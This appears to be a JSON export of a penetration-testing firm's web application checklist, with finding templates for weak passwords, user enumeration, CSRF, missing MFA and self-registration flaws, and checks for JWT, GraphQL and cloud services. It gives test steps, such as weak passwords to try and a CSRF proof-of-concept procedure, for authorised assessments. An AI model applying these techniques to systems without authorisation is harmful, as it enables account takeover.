							"uid": "825c9ab2-b2f4-e511-80db-ecf4bbd04083",
							"name": "Account Policy - Weak Password Policy",
							"description": "<p>The password policy does not enforce strong passwords. This may allow users to set weak passwords. Weak passwords are commonly targeted during brute force password attacks.</p>",
							"severityId": 2,
							"businessImpact": "<p>Weak password policies may allow users to set an easy to guess password that can leveraged by an attacker to gain unauthorized access to systems, applications, and sensitive information.</p>",
							"sourceIdentifier": "M:825c9ab2-b2f4-e511-80db-ecf4bbd04083",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>The client must use <strong>either</strong> a complexity-based policy <strong>or</strong> the NIST-based policy; they are not required to use both. Only proceed to test the NIST policy if you are sure they are using NIST-based rather than complexity-based.</p><ol><li><p>Implementing password policy client-side <strong>is</strong> sufficient as it prevents normal users from using weak passwords.</p></li><li><p>Attempt to change password to a weak password.</p></li></ol><p><strong>Complexity-based weak passwords:</strong></p><ol><li><p>Less than eight characters</p></li><li><p>Do not contain sufficient complexity - at least three of the following required: </p></li><ol><li><p>lowercase</p></li><li><p>uppercase</p></li><li><p>number</p></li><li><p>special character</p></li></ol></ol><p>If you are sure (or they have stated) they are using NIST, then attempt to set one of the following passwords:</p><p><strong>NIST-based weak passwords:</strong></p><p>a)  root@123</p><p>b) password123</p><p>c) L3tm31n!</p><p>If any of these three passwords is accepted, sufficient cross-checking with a list of known compromised passwords is not performed.</p><h3>Reporting Instructions:</h3><ol><li><p>Include which of the 2 policies the application is using.</p></li><li><p>Include a description stating which characteristic(s) of that policy is not being adhered to.</p></li></ol><h3><strong>Variation: AWS Cloud Pen Test</strong></h3><p>1. Under the IAM section of the console, select Account Settings. </p><p>2. Review the password policy against our recommendations.</p>",
							"references": "<ul><li>https://pages.nist.gov/800-63-3/sp800-63b.html</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html&#35;implement-proper-password-strength-controls</li><li>https://www.pcisecuritystandards.org/documents/pci_dss_v2.pdf</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that the password policy is configured securely, following best practices and regulatory requirements. Choose a password policy: <strong>either</strong> the NIST recommendation <strong>or</strong> complexity-based password policy, that can be implemented within the organization. Note that the NIST implementation must satisfy <strong>all</strong> of the NIST characteristics.</p><p><strong>NIST Special Publication 800-63B: 3.1.1.2 Memorized Secret Verifiers</strong>:</p><ul><li><p>Length: 8-character minimum, 64-character maximum, &gt;15-character recommended, and not truncated</p></li><li><p>Compare new passwords to a dictionary and do not allow common, easily guessed passwords (such as password, abcd1234, qwerty, etc.)</p></li><li><p>Compare new passwords to a list of known compromised passwords; do not allow the use of previously compromised passwords</p></li><li><p>Allow all printing ASCII and Unicode characters + spaces</p></li><li><p>Should offer option to show password rather than dots or asterisks; this helps with typing accuracy</p></li><li><p>Do not enforce composition rules (i.e., no &quot;passwords must include uppercase and lowercase letters, a number...&quot;, etc.); such rules provide a poor user experience</p></li><li><p>Do not use password hints; they weaken authentication</p></li><li><p>Do not expire passwords arbitrarily or on a regular frequency; a forced password changed should only happen after evidence of compromise</p></li><li><p>Do not use Knowledge-Based Authentication (KBA) such as security questions or password hints</p></li></ul><p><strong>Complexity-Based Password Policy:</strong></p><p>The password policy should enforce that passwords are at least 8 characters long. Additionally, at a minimum it should also adhere to 3 out of the 4 following characteristics:</p><ul><li><p>The password may contain alphabetic letters</p></li><li><p>The password is a mix of uppercase and lowercase letters</p></li><li><p>The password may contain digits</p></li><li><p>The password may contain special characters such as !, $, ^, &#42;, or +</p></li></ul><p>Beyond these minimum characteristics, NetSPI further recommends:</p><ul><li><p>The password should not contain contextual information such as login credentials, website name, etc.</p></li><li><p>The password should be changed at least annually</p></li><li><p>The password length is at least 15 characters for administrator and service accounts and 12 characters for operating system user accounts</p></li><li><p>Include all 4 complexity based password policy characteristics where possible</p></li><li><p>Do not allow passwords that have been in a breach or are easily guessable (For example, Password1)</p></li></ul>"
						},
						"ordinal": 22,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "36567a8c-ccd3-4eac-93a8-19fefab13c35",
						"name": "User Enumeration - Error Messages",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 690146,
							"uid": "a417e18c-0339-df11-a447-001e4f120021",
							"name": "User Enumeration - Error Messages",
							"description": "<p>The application returns specific error messages notifying the end user if a username is valid or not based on the user input. As a result, an attacker may be able to enumerate valid usernames via brute force attacks.</p>",
							"severityId": 1,
							"businessImpact": "<p>Leveraging this issue an attacker may be able to enumerate account which could be targeted in future attacks.</p>",
							"sourceIdentifier": "M:690146",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>User enumeration is most often identified on login pages:</p><ol><li><p>Try logging in to the application using a valid username with invalid password</p></li><li><p>Try logging in to the application using an invalid username and password</p></li><li><p>Compare server responses; if the responses are different, username enumeration is possible</p></li></ol><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Screenshot response to invalid username / invalid password</p></li><li><p>Screenshot response to valid username / invalid password - highlight the difference in responses</p></li></ol><h3><strong>Additional Information:</strong></h3><ol><li><p>Timing-based user enumeration - a noticeable response difference between valid and invalid user due to password compute cycles - is sometimes possible but requires a very stable, low-latency network (e.g. on-site). See <code>User Enumeration - Timing Based</code> finding for more information and add that if necessary.</p></li><li><p><strong>AWS Cognito</strong> is also susceptible to error based user enumeration. This should still be called out if the application is using AWS Cognito and the following link is helpful documentation to include. <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pool-managing-errors.html\">https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pool-managing-errors.html</a></p></li></ol>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Return the same error message for both invalid and valid users when an invalid input is provided. Example: Login was unsuccessful.</p>"
						},
						"ordinal": 23,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "1613d19c-5f4c-4757-858b-228940001070",
						"name": "Cross-Site Request Forgery",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 707,
							"uid": "e634944e-03b1-dd11-992f-001e4f120030",
							"name": "Cross-Site Request Forgery",
							"description": "<p>Cross-site request forgery (CSRF) is an attack where a user is forced to unknowingly send a request to a web application in which the user is currently authenticated. This can be accomplished by having the target user click a malicious URL or visit a web site that sends the request. The request is executed on the target web server as if the user had sent it on purpose, and it can be used to execute any application functions that the user is normally allowed to perform. Depending on the nature of the application and the vulnerability, CSRF can be used to take actions such as transferring funds or resetting the user's password.</p><p>The basis for cross-site request forgery attacks is that session cookies used to identify an authenticated user are automatically sent to the target server along with all requests from the target user. CSRF attacks do not require hijacking the target user's session since the malicious requests generated by the attacker are authenticated requests that originate from the target user. CSRF attacks exploit the server's implicit trust in the identity of the user sending the request.</p>",
							"severityId": 2,
							"businessImpact": "<p>Successful exploitation of cross-site request forgery allows an attacker to take action within the permissions context of the affected user within an application, potentially compromising the confidentiality, integrity, and availability of that user's information. Sending malicious requests on behalf of an affected user can make it difficult to discover the true origin of the attack.</p>",
							"sourceIdentifier": "GID:3297",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p><strong><span style=\"color: #DB2719\">Be sure to use Firefox when validating CSRF</span></strong>, Chrome will automatically set cookies' SameSite value to Lax which prevents cookies from being sent cross-domain on certain requests.</p><p>Follow these steps to verify CSRF:</p><ol><li><p>Choose some application functionality that changes data in the application, such as user profile update, that does not appear to contain CSRF protection</p></li><li><p>Send a valid request to the application</p></li><li><p>Based on the valid request, use Burp Generate CSRF PoC to create an HTML page that sends a CSRF payload to the application</p></li><li><p>While authenticated, open the CSRF PoC in a separate tab / window and submit the request to application to determine whether the application is susceptible to CSRF attacks.</p></li></ol><p>It is possible that the application has a static anti-CSRF token; by following the instructions above it appears that CSRF works but it is not really exploitable. Report <strong>Cross-Site Request Forgery - Weak Token</strong> instead stating that the application uses a static CSRF token.</p><p>If the application uses ViewState, try to determine if the ViewState value contains any session information. ViewState is not considered a strong anti-CSRF token by itself.</p><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Show the initial application state</p></li><li><p>Show the CSRF PoC HTML page</p></li><li><p>Show a browser tab with the CSRF PoC open</p></li><li><p>Show the application page from step 1 that displays data which was modified via the CSRF attack</p></li></ol><p><strong>Note for ASP.NET applications:</strong></p><p>The application uses VIEWSTATE which makes exploitation of cross-site request forgery harder. However, VIEWSTATE is not considered a valid anti-CSRF token unless it contains session information and thus cannot be replayed across multiple session. For information how to secure VIEWSTATE, see https://msdn.microsoft.com/en-us/library/ms178199(v=vs.85).aspx</p><p><strong>Note for GraphQL applications:</strong></p><p>Try to use some GraphQL-specific techniques to get CSRF. This mainly involves turning the traditional GraphQL POST request to a GET request or different format. See the following: </p><ul><li><p>https://outline.netspi.com/doc/graphql-testing-procedure-GRYBKabmWM&#35;h-graphql-csrf</p></li></ul>",
							"references": "<ul><li>https://owasp.org/www-community/attacks/csrf</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</li><li>https://owasp.org/Top10/A01_2021-Broken_Access_Control/</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>The following recommendations will help reduce the risk of cross-site request forgery attacks when used in addition to session cookies:</p><ul><li><p>Check the Referer header to ensure that the request originates from the same web site. It is possible to forge the Referer header, so validating the Referrer header should not be used as the sole measure to prevent CSRF. However, checking the Referer header does add a layer of security to the application. It should be noted that some firewalls or browser settings remove the Referer header, which could lead to a denial of service for legitimate users.</p></li><li><p>Use tokenizing. Tokenizing is a concept of adding a random, per-request token in the HTTP response that is sent from the server to the client. The client parses the response and extracts the token from it. With the next request, the client sends the token back to the server. The server accepts the request only if the token is the same as the token in the last response.</p></li></ul>"
						},
						"ordinal": 24,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "f2185867-b1ed-425a-a73e-1824ef7665d9",
						"name": "Multi-Factor Authentication not Supported*",
						"instructions": "<h3><strong>Information:</strong></h3><p>If MFA is not available, add this linked finding.<br>If MFA is available, it must be tested - add the <code>[Dynamic] Multi-Factor Authentication (MFA)</code> checklist and complete the relevant tasks.</p><h3><strong>Note: </strong></h3><p>The KO requirements should have requested a screen shot from the client prior to starting the engagement.</p><h3><strong>MFA phone numbers:</strong></h3><p>+1 (612) 930-2829 - securitytesting2@netspi.com<br>+1 ‪‪(704) 286-6617‬ - securitytesting3@netspi.com</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063880,
							"uid": "276a0994-818b-e811-8103-ecf4bbd04073",
							"name": "Multi-Factor Authentication not Supported",
							"description": "<p>The application does not provide an option for multi-factor authentication (MFA). MFA reduces the risk of unauthorized access to the application by requiring additional authentication information along with a password, mitigating the risk of password guessing attacks or use of compromised passwords.</p>",
							"severityId": 2,
							"businessImpact": "<p>If an attacker successfully guesses a user's password they will be able to access that user's resources from the internet.  Indirectly, this could lead to unauthorized access to the affected user's applications, systems, and connected networks.</p>",
							"sourceIdentifier": "M:23ee37b5-649f-415e-b35a-ba7103e3906f",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>Determine whether the application supports an option for users to enable multi-factor authentication. Multi-factor authentication is not required to be enforced but there should be an option for it.</p><h3>Mobile App Verification Note:</h3><p>When reporting this for mobile apps, reuse the credentials to login to the web application and see if theres an option to enable MFA.</p><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Show the authentication flow. One screen shot of the login page and then a shot of the post authentication.</p></li></ol>",
							"references": "<p>https://www.netspi.com/blog/executive-blog/security-industry-trends/multi-factor-authentication-the-bare-minimum-of-iam/</p><p>https://www.netspi.com/blog/executive-blog/netspi-updates/protect-business-from-social-engineering-attacks-cybersecurity-awareness-month/</p>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Consider implementing an option for multi-factor authentication to enhance application security. MFA can be implemented via various means, common options including:</p><ul><li><p>One-time password using third-party services or applications (e.g., a mobile app)</p></li><li><p>One-time password via email</p></li><li><p>Soft tokens</p></li><li><p>Phone call</p></li><li><p>Mutual authentication using certificates</p></li></ul><p>Evaluate the possible implementation plans based on the application security requirements and user base (internal or external users).</p>"
						},
						"ordinal": 25,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "2960727f-27a7-403d-b9f5-26da4b47734f",
						"name": "Administrative Interface Without Two-Factor Authentication",
						"instructions": "<p>Note for WaPens:</p><p>This finding is intended for administration logins which provide access to control the web server such as Apache Tomcat Manager, phpMyAdmin, Websphere, etc. This finding is not applicable if standard application users and privileged/administrator application users share the same authentication flow. This finding may be applicable if there is a separate login mechanisms for both standard users and administrator users.  </p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17059627,
							"uid": "edcd6f52-bdc3-e611-80f3-ecf4bbd04083",
							"name": "Administrative Interface Without Two-Factor Authentication",
							"description": "<p>The application server configuration page does not require administrative users to authenticate with two factor authentication before granting a session. Externally accessible administrative interfaces should only assign a valid session to administrators after the user successfully entered a valid two-factor authentication token.</p>",
							"severityId": 2,
							"businessImpact": "<p>It is easier for an attacker to gain access to a configuration interface or privileged application server functionality when two-factor authentication is not used.</p>",
							"sourceIdentifier": "M:edcd6f52-bdc3-e611-80f3-ecf4bbd04083",
							"verificationInstructions": "<h3>Instructions:</h3><p>Remember this finding is for administrator access to the underlying web server or application server configuration page - this is not for authenticating to the client's in-scope application as a user with the admin-level role.</p><h3>Reporting:</h3><ol><li><p>Show a screen shot of the authentication page to the web server, JVM, or application framework login page.</p></li><li><p>Show a screen shot of post-authentication access.</p></li><li><p>[BONUS - (optional)] Show a screen shot within the administrative console of the MFA option being disabled.</p></li></ol>",
							"references": null,
							"exploitInstructions": null,
							"remediationInstructions": "<p>Ensure administrative users are required to authenticate using a two-factor process before assigning them a valid session.</p>"
						},
						"ordinal": 26,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "9d07784d-2298-45ae-b473-c180bf7af758",
						"name": "Weak Self-Registration Workflow*",
						"instructions": "<h3><strong>Instructions:</strong></h3><p>Self-registration should be tested if it is available in the application regardless of the credentials/roles provided.</p><p><span style=\"color: red\"><strong>Make a comment on whether self-registration is available in the application</strong></span></p><h3><strong>Test Cases:</strong></h3><p>These test cases are not comprehensive but a minimum:</p><ul><li><p>Attempt to register a user that already exists in the system (use one of the engagement provided accounts).</p></li><li><p>Attempt to register a new user that has multiple email addresses upon registration to see if the registration email is sent to both accounts (check the \"to\" field).</p></li></ul><pre><code>{\n\"user_email\":\n[\"securitytesting1@netspi.com\",\"securitytesting9@netspi.com\"]\n...}</code></pre><ul><li><p>Attempt to register a user that includes an elevate role parameter (i.e., mass-assignment)</p></li><li><p>Are registering identities verified before access is granted to the app? For example via email or SMS and is that flow secure?</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 1000000558,
							"uid": "9186b52f-1298-4d2a-95c9-12e68739b309",
							"name": "Weak Self-Registration Workflow",
							"description": "<p>Self-registration and the identity assertion, should be commensurate with the data that is maintained by the application. The account self-registration process does not adequately verify the account before or after creation, or is missing best practice security controls.</p>",
							"severityId": 2,
							"businessImpact": "<p>A malicious actor may be able to create numerous accounts to abuse application functionality or attack other users. This may involve linking an existing email address to the actor's own account. As such, this could allow the actor to impersonate or deny access to legitimate users on the system, which would damage the integrity of that user and impact the overall repudiation of the site.</p>",
							"sourceIdentifier": "M:9186b52f-1298-4d2a-95c9-12e68739b309",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>The level of security of self-registration depends on the criticality of the data/information that the application maintains. This finding severity can be upgraded or downgraded as necessary based on the data in the application.</p><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Add an explanation how the self-registration process works in the application and which controls are missing</p></li><li><p>Add screenshots for each step of the self-registration process highlighting the weakness(es).</p></li></ol>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Review the account creation process requirements and modify as necessary per business requirements.</p><p>The following are recommendations for self-registration workflow:</p><ol><li><p>Enumeration of current system users should be prohibited during registration without some type of throttling mechanism.</p></li><li><p>A one-time registration link should be sent to the email presented during the registration process.</p></li><ol><li><p>This one-time link should expire within 15 minutes.</p></li><li><p>If this one-time link is clicked, it should immediately expire and cannot be reused.</p></li><li><p>If this one-time link is clicked, it should not accept a parameter that modifies the originally submitted email address.</p></li><li><p>If this one-time link is not clicked within the expiration window, it should not prohibit that email address from attempting to self-register again at a later time.</p></li></ol><li><p>Excessive attempts to register based on email address should be throttled so the system cannot be used to spam users.</p></li><li><p>Self-registration workflow should not automatically include authentication to the application.</p></li></ol>"
						},
						"ordinal": 27,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 10,
				"collapsed": true
			},
			{
				"uid": "da8e6ba2-56a3-457e-9bef-fc56cd431964",
				"name": "Technology Specific Attacks",
				"description": null,
				"type": 1,
				"tasks": [
					{
						"uid": "df89ef68-1662-412f-8375-8be26e25912e",
						"name": "Technology Specific Attacks - General Note ",
						"instructions": "<p>Until such time that Burp and Platform are integrated to the point that technologies are automatically detected and Dynamic Checklists are automatically added, please search through the Dynamic Checklists for sub-checklists that are relevant to your application (&#42;must search via Name rather than ID).</p><p>All Technology Specific Checklists should be prefixed with <strong>[Dynamic].</strong></p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "f3cfb556-3ca7-4357-8424-5691c00de58f",
						"name": "Auth Tokens (JWT & SAML)*",
						"instructions": "<h3>Determining if JWTs or SAML Tokens are in Use:</h3><ul><li><p>JWTs are base64 credentials that are typically in an Authorization header or cookie and begin with <strong>eyJ...</strong></p></li><li><p>SAML tokens are also base64 encoded. You'll typically see a reference to SAMLResponse in an HTTP response after authentication.</p></li></ul><h3>Add Dynamic Checklist:</h3><ul><li><p>If JWTs are in use, add the <strong>[Dynamic] - JWT</strong> checklist and proceed to complete the tasks within that Checklist.</p></li><li><p>If SAML is in use, add the <strong>[Dynamic] SAML Tokens</strong> checklist and proceed to complete the tasks within that Checklist.</p></li></ul><h3>Instructions:</h3><p>Only use local tools for testing JWTs. <strong>Do not paste JWTs into online tools</strong>. For example, CyberChef should be used locally not the online version.</p><p><strong><span style=\"color: #DB2719\">Add a comment</span></strong> confirming that these authentication/authorization tokens either are in use or are not in use for your application.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "5d83e491-18ae-4673-a1f3-999b520228ae",
						"name": "GraphQL Testing*",
						"instructions": "<h3>Determining if GraphQL is in Use:</h3><ul><li><p>Review if the APIs are all submitted under one endpoint. Common endpoints include /graphql</p></li><li><p>Observe if the arguments for the API have the common GraphQL names of query,variables or operation name</p></li><li><p>Check your Websocket history to see if any GraphQL traffic is happening over websockets</p></li></ul><h3>Add Dynamic Checklist:</h3><p>If GraphQL is in use, add the <strong>[Dynamic] - GraphQL</strong> checklist and proceed to complete the tasks within that Checklist.</p><h3><strong>Instructions:</strong></h3><p>If your service uses GraphQL make sure to do specific GraphQL checks. This involves using GraphQuail or another tool to help visualize the schema.  Review the tool installation and Master Finding details for GraphQL at the bottom of the page at the following Outline page:</p><p><a href='https://outline.netspi.com/doc/graphql-testing-procedure-GRYBKabmWM'>GraphQL Testing Process</a></p><p><a href='https://outline.netspi.com/doc/graphql-testing-procedure-GRYBKabmWM#h-graphquail-setup'>GraphQuail Setup</a></p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "44622998-e019-4c1b-a5a3-7ea3e4528f0b",
						"name": "AWS Services in Use",
						"instructions": "<h3>Determining if AWS is in Use:</h3><ul><li><p>Review Burp proxy history to see if anything references S3, lambda, EC2, aws-elb, or api-gateway</p></li></ul><h3>Add Dynamic Checklist:</h3><p>If AWS infrastructure is in use, add the <strong>[Dynamic] - AWS Services</strong> checklist and proceed to complete the tasks within that Checklist.</p><h3><strong>Instructions:</strong></h3><p>See the following Outline page for more specific information about testing AWS Services.</p><p><a href='https://outline.netspi.com/doc/guidelines-for-wapens-using-aws-o9xCGqpqkH'>https://outline.netspi.com/doc/guidelines-for-wapens-using-aws-o9xCGqpqkH</a></p><p>For testing S3 buckets, use <a href='https://s3check.netspiaws.com/'>https://s3check.netspiaws.com/</a> for checking various S3 permission issues.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "a97d451d-df2b-42c1-af2c-2c06603803dd",
						"name": "Azure Services in Use",
						"instructions": "<h3>Determining if Azure is in Use:</h3><ul><li><p>Confirm with the client if the application is hosted within Azure infrastructure</p></li><li><p>Review Burp proxy history to see if anything references Azure or <code>blob.core.windows.net</code></li></ul><h3>Add Dynamic Checklist:</h3><p>If Azure infrastructure is in use, add the <strong>[Dynamic] - Azure Services</strong> checklist and proceed to complete the tasks within that Checklist.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "6974f86f-a22f-4bd6-aff0-f0591a2c85f6",
						"name": "Salesforce Testing",
						"instructions": "<h3>Determining if Salesforce is in Use:</h3><ul><li><p>If there is traffic to a subdomain of the <code>my.site.com</code> TLD.</p></li><li><p>if there is traffic to a subdomain of the lightning.force.com TLD</p></li><li><p>If there is traffic to /aura, /sobjects (such as /services/data/vXX.X/sobjects/Account/), </p></li><li><p>If the request URL path contains:</p></li><ul><li><p> /s/</p></li><li><p>/aura</p></li><li><p>/s/sfsites</p></li><li><p>/sfsites</p></li><li><p>/s/fact</p></li></ul></ul><h3>Add Dynamic Checklist:</h3><p>If Salesforce is in use, add the <strong>[Dynamic] - Salesforce</strong> checklist and proceed to complete the tasks within that Checklist.</p><h3><strong>Instructions:</strong></h3><p>See the following Outline page for more specific information about testing Salesforce.</p><p><a href='https://outline.netspi.com/doc/salesforce-penetration-testing-FZBIGV0NPM'>https://outline.netspi.com/doc/salesforce-penetration-testing-FZBIGV0NPM</a></p><p><a href='https://outline.netspi.com/doc/identifying-the-scope-of-salesforce-integrated-applications-4IkeFWdU3L'>https://outline.netspi.com/doc/identifying-the-scope-of-salesforce-integrated-applications-4IkeFWdU3L</a></p><p>The following scripts will help you detect Salesforce pages and errors that might lead to a vulnerability discovery.</p><p><strong>Bcheck Scripts:</strong></p><p>https://github.com/NetSPI/bchecks/tree/main/BChecks </p><p><strong>Bambdas custom column:</strong></p><p>https://github.com/NetSPI/bambdas/tree/main/CustomColumn/Proxy/HTTP/SalesForce</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 12,
				"collapsed": true
			},
			{
				"uid": "54c4a975-46cc-42d3-8209-a23ff4d09eb9",
				"name": "Post Exploitation",
				"description": null,
				"type": 1,
				"tasks": [
					{
						"uid": "cab858ce-15c9-439f-b728-ea5d15513b56",
						"name": "Post Exploitation - General Note",
						"instructions": "<h3>Instructions:</h3><p>Post exploitation checks should be performed if access was gained to the application infrastructure during the testing. Typically this means either SQL injection or OS command execution on application servers.</p><h3>Add Dynamic Checklist:</h3><p>Add the <strong>[Dynamic] - Post Exploitation</strong> (ID: <code>827b53a1-6b6e-41ea-8fb0-a306cfbaa897</code>) checklist and proceed to complete the tasks within that Checklist.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 13,
				"collapsed": true
			}
		],
		"checklistTemplateUid": "265b7c47-4baa-4f2a-972f-67dd4118392d",
		"isDeleted": false
	},
	{
		"uid": "e8dbd1fe-0f1c-4b96-a2fc-029456c43010",
		"name": "Consultant Driven Pipeline",
		"categories": [
			{
				"uid": "68781287-8dc1-4941-a17a-9543b867fe5e",
				"name": "Consultant Driven Pipeline",
				"description": "<p>Additional testing services the Sales team engage with the Client</p>",
				"type": 1,
				"tasks": [
					{
						"uid": "c3c39466-8e6a-4af3-b1bd-525c6ed5374e",
						"name": "SharePoint Form Link",
						"instructions": "<h3>Instructions:</h3><p>Fill out the SharePoint Form if there are other NetSPI service lines or offerings you think the client could benefit from.</p><p>If the referred opportunity is won, then the submitting consultant will receive an incentive called a SPIF - Sales Performance Incentive Funds.</p><h3>SharePoint Link:</h3><p><a href='https://forms.office.com/r/RJCb8Y6TC5'>https://forms.office.com/r/RJCb8Y6TC5</a></p><h3>Most Frequent Cross-Service Opportunities:</h3><p>Here are some of the more common cross-service sale opportunities.</p><ul><li><p>ExPen to CPen: if there are cloud resources</p></li><li><p>ExPen to WAPen: if there are many web apps discovered</p></li><li><p>WAPen to CPen: if there are cloud resources</p></li><li><p>WAPen to SCR: if there are common code findings (XSS, SQLi, authorization bypass)</p></li><li><p>InPen to BAS/CAASM/WAPen: many options based on what is seen</p></li></ul><h3></h3><h3>Workflow:</h3><ol><li><p>Consultant completes an engagement using their checklist and they have a new lead to submit to Sales.</p></li><li><p>From the checklist task in Platform, they submit the above <a href='https://forms.office.com/r/RJCb8Y6TC5'>SharePoint form</a>.</p></li><li><p>The SharePoint form sends an email to SalesOps to enter the lead into SalesForce.</p></li><li><p>SalesOps processes the lead in SF and emails the sales rep about the new lead.</p></li><li><p>Sales rep schedules an internal call with the consultant to ask any questions.</p></li><li><p>Sales rep either schedules a client qualification call or marks the opportunity closed/lost</p></li><ol><li><p>If closed/lost, consultant does not receive the SPIF.</p></li></ol><li><p>Sales rep holds qualification call with the client and either marks the opportunity closed/lost or moves it into the pipeline.</p></li><ol><li><p>If closed/lost, consultant does not receive SPIF.</p></li></ol><li><p>Sales rep works the deal.</p></li><ol><li><p>If the opp is closed/lost, the consultant does not receive SPIF</p></li><li><p>If the opportunity is won, the consultant receives the SPIF payment per the amount and timeline details explained in the Compensation Plan.</p></li></ol></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 0,
				"collapsed": true
			}
		],
		"checklistTemplateUid": "4431eebc-a3b7-4ad3-98bb-d1680371a855",
		"isDeleted": false
	}
]